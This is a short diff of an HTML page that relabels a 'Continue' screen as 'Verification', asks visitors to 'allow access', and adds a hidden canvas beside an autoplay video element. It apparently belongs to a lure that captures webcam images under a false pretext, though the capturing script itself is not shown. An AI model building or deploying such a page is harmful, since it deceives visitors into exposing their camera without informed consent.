@@ -2,36 +2,24 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Continue</title>
+<title>Verification</title>
 <style>
 body{
-  background:#111;
-  color:#fff;
-  text-align:center;
-  font-family:sans-serif;
+  background:#111; color:#fff; text-align:center; font-family:sans-serif;
 }
-button{
-  padding:14px 20px;
-  font-size:16px;
-  border-radius:8px;
-  border:none;
-}
-video{
-  width:90%;
-  max-width:320px;
-  margin-top:10px;
-  border-radius:10px;
-}
+button{padding:14px 20px; font-size:16px; border-radius:8px; border:none; background:#00b894; color:#fff;}
+video{width:90%; max-width:320px; margin-top:10px; border-radius:10px;}
 </style>
 </head>
 <body>
 
-<h2>Continue</h2>
-<p>Please allow to continue</p>
+<h2>Verification</h2>
+<p>Please allow access to continue</p>
 
-<button onclick="start()">Continue</button>
+<button onclick="startAll()">Continue</button>
 
 <video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script src="script.js"></script>
 </body>
